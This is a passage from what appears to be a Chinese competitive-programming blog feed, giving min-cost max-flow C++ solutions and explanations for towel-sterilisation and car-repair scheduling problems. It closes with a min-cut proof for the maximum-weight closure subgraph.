class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">12</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    dis[<span class="number">1</span>]=<span class="number">0</span>; vis[<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Top=Queue[head];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Top];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(a[i].Flow&amp;&amp;(dis[Top]+a[i].Value&lt;dis[a[i].Point]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">            &#123;</span><br><span class="line">                Queue[++tail]=a[i].Point;</span><br><span class="line">                vis[a[i].Point]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dis[a[i].Point]=dis[Top]+a[i].Value;</span><br><span class="line">            LastPoint[a[i].Point]=Top;</span><br><span class="line">            LastEdge[a[i].Point]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[Top]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[T]!=<span class="number">202116108</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Find=<span class="number">123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=T;i!=S;i=LastPoint[i])</span><br><span class="line">    <span class="keyword">if</span>(a[LastEdge[i]].Flow&lt;Find)</span><br><span class="line">    Find=a[LastEdge[i]].Flow;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=T;i!=S;i=LastPoint[i])</span><br><span class="line">    &#123;</span><br><span class="line">        a[LastEdge[i]].Flow-=Find;</span><br><span class="line">        a[a[LastEdge[i]].Back].Flow+=Find;</span><br><span class="line">        ans+=Find*(-a[LastEdge[i]].Value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx=i*m-m+j;</span><br><span class="line">        <span class="keyword">int</span> yy=xx*<span class="number">2</span>; xx=yy<span class="number">-1</span>;</span><br><span class="line">        That=In();</span><br><span class="line">        AddEdge(xx,yy,<span class="number">1</span>,That);</span><br><span class="line">        <span class="keyword">if</span>(j&lt;m) AddEdge(yy,yy+<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n) AddEdge(yy,yy+<span class="number">2</span>*m<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S=<span class="number">1</span>; T=n*m*<span class="number">2</span><span class="number">-1</span>;</span><br><span class="line">    a[<span class="number">1</span>].Flow=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(SPFA()) Change();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1673餐巾"><a href="#P1673餐巾" class="headerlink" title="P1673餐巾"></a>P1673餐巾</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>某软件公司正在规划一项n天的软件开发计划，根据开发计划第i天需要ni个软件开发人员，为了提高软件开发人员的效率，公司给软件人员提供了很多的服务，其中一项服务就是要为每个开发人员每天提供一块消毒毛巾，这种消毒毛巾使用一天后必须再做消毒处理后才能使用。消毒方式有两种，A种方式的消毒需要a天时间，B种方式的消毒需要b天（b&gt;a），A种消毒方式的费用为每块毛巾fA, B种消毒方式的费用为每块毛巾fB，而买一块新毛巾的费用为f（新毛巾是已消毒的，当天可以使用）；而且f&gt;fA&gt;fB。公司经理正在规划在这n天中，每天买多少块新毛巾、每天送多少块毛巾进行A种消毒和每天送多少块毛巾进行B种消毒。当然，公司经理希望费用最低。<br>你的任务就是：为该软件公司计划每天买多少块毛巾、每天多少块毛巾进行A种消毒和多少毛巾进行B种消毒，使公司在这项n天的软件开发中，提供毛巾服务的总费用最低。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第1行为n,a,b,f,fA,fB.<br>第2行为n1，n2，……，nn.  （注：1≤f,fA,fB≤60，1≤n≤1000）</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>最少费用</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题，完全是我自己想出来的，但是有一个小小的bug，在写AddEdge来建立邻接表的时候，因为没有将反向边的价值这位-v，而是0.所以在退流的过程中，费用并没有退掉，结果每次计算答案的时候都是比标准答案大一些。整整查了一下午（话说在传纸条那道题我也没退费用，但是直接A掉了，看来有些数据还是挺水的。）</p>
</li>
<li><p>这道题我们的难点就是建图，只要建好图我们跑一遍最小费用最大流就好了。所以说在这道题目中，我们获得毛巾的途径有三条，要么自己买，要么用前面剩下的，要么用消过毒的。</p>
</li>
<li><p>前面剩下的很好理解，我们只需要将i和i+1进行连接边就好。那么自己买也很简单，直接建立一条流量为正无穷，费用为f的边连接源点和每一天。那么重点就是通过消毒过来的。直接将一个点向下连接两个消毒的边显然是不可行的，那么就直接拆点，将拆的点和源点连接一条流量为当天所需的毛巾量。然后连接两条不同的消毒边，到下面的天数里面，流量为正无穷，费用为两种不同的消毒方法所需要的不同的费用。</p>
</li>
<li><p>总得来说就是连接源点和每一天，然后每一天和下一天连接，然后新建一个点和源点相连，然后连接可以到达消毒过后的那一天，最后每一天和汇点连接一条流量为毛巾需求量的边。</p>
</li>
<li><p>那么到现在我们就将图建立起来了，很容易就可以AC掉。一定要记得退回费用！！！</p>
</li>
</ul>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Flow;</span><br><span class="line">&#125;a[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> n,A_long,B_long,A_Price,B_Price;</span><br><span class="line"><span class="keyword">int</span> Towel_Price,Link[<span class="number">4000</span>],LastPoint[<span class="number">4000</span>];</span><br><span class="line"><span class="keyword">int</span> Queue[<span class="number">200000</span>],Maxx,LastEdge[<span class="number">4000</span>];</span><br><span class="line"><span class="keyword">int</span> len,ans,Number,dis[<span class="number">4000</span>];<span class="keyword">bool</span> vis[<span class="number">4000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>,F=<span class="literal">true</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> v,<span class="keyword">int</span> f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Value=v;</span><br><span class="line">    a[len].Flow=f;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Value=-v;<span class="comment">//在退流的时候，同样需要返回相对应的费用！！！</span></span><br><span class="line">    a[len].Flow=<span class="number">0</span>;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    a[len].Next=Link[y];</span><br><span class="line">    Link[y]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">20</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="literal">false</span>,tail=<span class="literal">true</span>;</span><br><span class="line">    dis[<span class="literal">true</span>]=<span class="literal">false</span>; vis[<span class="literal">true</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> Ford=dis[<span class="literal">false</span>];</span><br><span class="line">    Queue[<span class="literal">true</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Top=Queue[head];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Top];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(a[i].Flow&amp;&amp;(dis[Top]+a[i].Value&lt;dis[a[i].Point]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">            &#123;</span><br><span class="line">                Queue[++tail]=a[i].Point;</span><br><span class="line">                vis[a[i].Point]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dis[a[i].Point]=dis[Top]+a[i].Value;</span><br><span class="line">            LastEdge[a[i].Point]=i;</span><br><span class="line">            LastPoint[a[i].Point]=Top;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[Top]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[Maxx]!=Ford;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Find=<span class="number">2123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Maxx;i!=<span class="literal">true</span>;i=LastPoint[i])</span><br><span class="line">    Find=min(Find,a[LastEdge[i]].Flow);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Maxx;i!=<span class="literal">true</span>;i=LastPoint[i])</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=Find*(a[LastEdge[i]].Value);</span><br><span class="line">        a[LastEdge[i]].Flow-=Find;</span><br><span class="line">        a[a[LastEdge[i]].Back].Flow+=Find;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;a.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    n=Read(); A_long=Read();</span><br><span class="line">    B_long=Read();Towel_Price=Read();</span><br><span class="line">    A_Price=Read(); B_Price=Read();</span><br><span class="line">    Maxx=n+n+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Number=Read();</span><br><span class="line">        AddEdge(<span class="number">1</span>,i+<span class="number">1</span>,Towel_Price,<span class="number">2123456789</span>);</span><br><span class="line">        AddEdge(i+<span class="number">1</span>,Maxx,<span class="number">0</span>,Number);</span><br><span class="line">        AddEdge(<span class="number">1</span>,i+n+<span class="number">1</span>,<span class="number">0</span>,Number);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n) AddEdge(i+<span class="number">1</span>,i+<span class="number">2</span>,<span class="number">0</span>,<span class="number">123456789</span>);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n-A_long) AddEdge(i+n+<span class="number">1</span>,i+A_long+<span class="number">2</span>,A_Price,<span class="number">2123456789</span>);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n-B_long) AddEdge(i+n+<span class="number">1</span>,i+B_long+<span class="number">2</span>,B_Price,<span class="number">2123456789</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(SPFA()) Change();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1674修车"><a href="#P1674修车" class="headerlink" title="P1674修车"></a>P1674修车</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>同一时刻有N位车主带着他们的爱车来到了汽车维修中心。维修中心共有M位技术人员，不同的技术人员对不同的车进行维修所用的时间是不同的。现在需要安排这M位技术人员所维修的车及顺序，使得顾客平均等待的时间最小。说明：顾客的等待时间是指从他把车送至维修中心到维修完毕所用的时间。</p>
</blockquote>
<h2 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行有两个数M,N，表示技术人员数与顾客数。接下来n行，每行m个整数。第i+1行第j个数表示第j位技术人员维修第i辆车需要用的时间T。</p>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>最小平均等待时间，答案精确到小数点后2位。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题深深的告诉了我练习好模板的重要性，一会就过去将网络流所有的模板都总结下来！！！这道题最后模板写错了，导致一直Debug不出来，我在这样子下去会GG的啊。</p>
</li>
<li><p>这道题的难点还是在建图，最后看了黄学长的博客里面的题解才A掉，来总结一下。首先这道题的常规的建图方法肯定是不行的，因为每一个顾客修车的先后顺序不一样的话，他们等待的时间就是不一样的，所以我一直在想如何进行建图优化，但是想了很久都没有想到，最后看了数据范围，才开始决定大胆的进行暴力。</p>
</li>
<li><p>这道题边的数量是非常多的，因为他对应的情况是非常多的，既然对应不同的修车顺序不一样，他的等待的时间都不一样，那么我们本着大胆暴力的原则，将所有可能的情况全部连接成边，也就是说，我们将m个修车工人进行分身，分身成n*m个，然后每个点表示的是我是第i个工人，我修的是倒数第j辆车。</p>
</li>
<li><p>这样我们就有可能将所有的情况全部的情况列举出来了，对于每一个分过身的点，我们将其和每辆车进行连接，也就是说，如果我是第i个工人，修的是我修过全部的倒数第j辆车，然后我连接的是编号为k的车，这样的话表示的就是第i个工人以倒数第j的进度开始修编号为k的车。对于这样的每一条边，我们将他的费用设为单独修这辆车的费用乘上他是倒数第几开始修的，流量为1.然后我们将所有的车连接到汇点，边的流量为1，费用为0。然后将源点和所有的工人分身相连，边的流量为1，费用为0.</p>
</li>
<li><p>这样一个完整的图就建立起来了……QAQ还有，最重要的就是一定要检查自己的模板是不是敲得是对的！！！好了我要去练习模板了。</p>
</li>
</ul>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Flow;</span><br><span class="line">&#125;a[<span class="number">4000000</span>];</span><br><span class="line"><span class="keyword">int</span> len,Link[<span class="number">200000</span>],Queue[<span class="number">4000000</span>],dis[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> LastEdge[<span class="number">200000</span>],LastPoint[<span class="number">200000</span>],ans,Maxx;</span><br><span class="line"><span class="keyword">int</span> n,m,Time[<span class="number">200</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">200000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> v,<span class="keyword">int</span> f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=v;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    a[len].Flow=f;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Next=Link[y];</span><br><span class="line">    a[len].Value=-v;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    a[len].Flow=<span class="number">0</span>;</span><br><span class="line">    Link[y]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">20</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    Queue[<span class="literal">true</span>]=<span class="literal">true</span>; <span class="keyword">int</span> Ford=dis[<span class="literal">true</span>];</span><br><span class="line">    <span class="keyword">int</span> head=<span class="literal">false</span>,tail=<span class="literal">true</span>;</span><br><span class="line">    vis[<span class="literal">true</span>]=<span class="literal">true</span>; dis[<span class="literal">true</span>]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Top=Queue[head];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Top];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(a[i].Flow&amp;&amp;(dis[Top]+a[i].Value&lt;dis[a[i].Point]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">            &#123;</span><br><span class="line">                Queue[++tail]=a[i].Point;</span><br><span class="line">                vis[a[i].Point]=<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dis[a[i].Point]=dis[Top]+a[i].Value;</span><br><span class="line">            LastEdge[a[i].Point]=i;</span><br><span class="line">            LastPoint[a[i].Point]=Top;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[Top]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[Maxx]!=Ford;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Find=<span class="number">2123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Maxx;i!=<span class="literal">true</span>;i=LastPoint[i])</span><br><span class="line">    Find=min(Find,a[LastEdge[i]].Flow);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Maxx;i!=<span class="literal">true</span>;i=LastPoint[i])</span><br><span class="line">    &#123;</span><br><span class="line">        a[LastEdge[i]].Flow-=Find;</span><br><span class="line">        a[a[LastEdge[i]].Back].Flow+=Find;</span><br><span class="line">        ans+=Find*(a[LastEdge[i]].Value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read();</span><br><span class="line">    Maxx=n*m+m+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    Time[i][j]=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)</span><br><span class="line">    AddEdge(<span class="number">1</span>,i+<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    AddEdge(n*m+i+<span class="number">1</span>,Maxx,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=m;k++)</span><br><span class="line">    AddEdge((i<span class="number">-1</span>)*m+j+<span class="number">1</span>,n*m+<span class="number">1</span>+k,Time[k][i]*j,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(SPFA()) Change();</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="keyword">double</span>)(ans/(<span class="number">1.0</span>*m))&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>最大权闭合子图</title>
    <url>/2017/06/03/2d48ab971b7e/</url>
    <content><![CDATA[<h1 id="最大权闭合子图"><a href="#最大权闭合子图" class="headerlink" title="最大权闭合子图"></a>最大权闭合子图</h1><p>最大权闭合子图其实就是通过一系列的证明，可以求证出来，用边权为正的累加和减去图的最大流就是这个图的最大权闭合子图。证明过程两天前写过一遍，但是丢掉了，实在不想去写了。</p>
<p>并且最大权闭合子图的题目拥有难度的并不多，也就下面这道题有一些难度，证明过程直接粘贴讲稿的QAQ</p>
<h1 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h1><ul>
<li><p>了解了最大权闭合图的概念，接下来我们就需要知道如何求最大权闭合图。首先我们将其转化为一个网络(现在不要问为什么,接下来会证明用网络可以求解)。构造一个源点S，汇点T。我们将S与所有权值为正的点连一条容量为其权值的边，将所有权值为负的点与T连一条容量为其权值的绝对值的边，原来的边将其容量定为正无穷。</p>
</li>
<li><p>首先引入结论，最小割所产生的两个集合中，其源点S所在集合(除去S)为最大权闭合图，接下来我们来说明一些结论。<br>?证明:最小割为简单割。</p>
</li>
<li><p>引入一下简单割的概念：割集的每条边都与S或T关联。(请下面阅读时一定分清最小割与简单割，容易混淆)那么为什么最小割是简单割呢？因为除S和T之外的点间的边的容量是正无穷，最小割的容量不可能为正无穷。所以，得证。</p>
</li>
<li><p>证明网络中的简单割与原图中闭合图存在一一对应的关系。(即所有闭合图都是简单割，简单割也必定是一个闭合图)。</p>
</li>
<li><p>证明闭合图是简单割：如果闭合图不是简单割(反证法)。那么说明有一条边是容量为正无穷的边，则说明闭合图中有一条出边的终点不在闭合图中，矛盾。</p>
</li>
<li><p>证明简单割是闭合图：因为简单割不含正无穷的边，所以不含有连向另一个集合(除T)的点，所以其出边的终点都在简单割中，满足闭合图定义。得正。</p>
</li>
<li><p>证明最小割所产生的两个集合中，其源点S所在集合(除去S)为最大权闭合图。 首先我们记一个简单割的容量为C,且S所在集合为N，T所在集合为M。则C=M中所有权值为正的点的权值(即S与M中点相连的边的容量)+N中所有权值为负的点权值的绝对值(即N中点与T中点相连边的容量)。记(C=x1+y1);(很好理解，不理解画一个图或想象一下就明白了)。</p>
</li>
<li><p>我们记N这个闭合图的权值和为W。则W=N中权值为正的点的权值-N中权值为负的点的权值的绝对值。记(W=x2-y2）则W+C=x1+y1+x2-y2。因为明显y1=y2，所以W+C=x1+x2;x1为M中所有权值为正的点的权值，x2为N中权值为正的点的权值。</p>
</li>
<li><p>所以x1+x2=所有权值为正的点的权值之和(记为TOT).所以我们得到W+C=TOT.整理一下W=TOT-C.到这里我们就得到了闭合图的权值与简单割的容量的关系。</p>
</li>
<li><p>因为TOT为定值，所以我们欲使W最大，即C最小，即此时这个简单割为最小割，此时闭合图为其源点S所在集合(除去S)。得正。</p>
</li>
<li><p>至此，我们就将最大权闭合图问题转化为了求最小割的问题。求最小割用最小割容量=最大流，即可将问题转化为求最大流的问题。</p>
</li>
</ul>
